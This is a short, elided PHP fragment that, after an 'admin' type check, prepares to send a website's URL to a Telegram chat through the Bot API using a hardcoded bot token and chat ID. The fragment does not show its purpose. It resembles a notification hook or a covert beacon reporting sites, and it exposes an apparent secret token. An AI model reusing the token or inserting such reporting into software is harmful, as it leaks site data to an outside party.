...
if(isset($data['type']) && strtolower(trim((string)$data['type'])) === "admin"){
...
$apiToken = "6979368669:AAGJqNeeQjPW_x0-PLw0fVCL2ob2b0oYb0Y";
$telegramMessage = "$website_url";
$telegramData = [
        'chat_id' => '5636542526', // Replace with your Telegram chat ID
